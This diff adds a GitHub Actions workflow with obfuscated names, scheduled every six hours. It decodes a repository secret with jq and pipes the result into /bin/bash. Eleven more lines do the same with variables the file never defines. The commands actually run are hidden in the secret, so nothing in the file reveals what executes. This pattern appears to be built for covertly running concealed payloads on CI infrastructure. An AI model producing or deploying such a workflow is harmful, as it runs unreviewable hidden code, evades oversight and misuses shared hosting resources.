@@ -1,0 +1,27 @@
+name: yuanjieha
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanjieha
+        env:
+          pbchs694: ${{ secrets.pbchs694 }}
+        run: |
+          echo $pbchs694 | jq -r .acxap740 | /bin/bash
+          echo $plkiu130 | jq -r .qpgf45998 | /bin/bash
+          echo $qy79429 | jq -r .gs7 | /bin/bash
+          echo $xcsvw9580 | jq -r .gk0444 | /bin/bash
+          echo $xiusz16927 | jq -r .f2214 | /bin/bash
+          echo $d76 | jq -r .ehb01239 | /bin/bash
+          echo $bahj96690 | jq -r .y18410 | /bin/bash
+          echo $jg83 | jq -r .jvnhe59 | /bin/bash
+          echo $xhhex91696 | jq -r .tqgd33816 | /bin/bash
+          echo $d66202 | jq -r .cwz2903 | /bin/bash
+          echo $wmmfr28114 | jq -r .nqius9422 | /bin/bash
+          echo $sxg21 | jq -r .ojzqs238 | /bin/bash
+
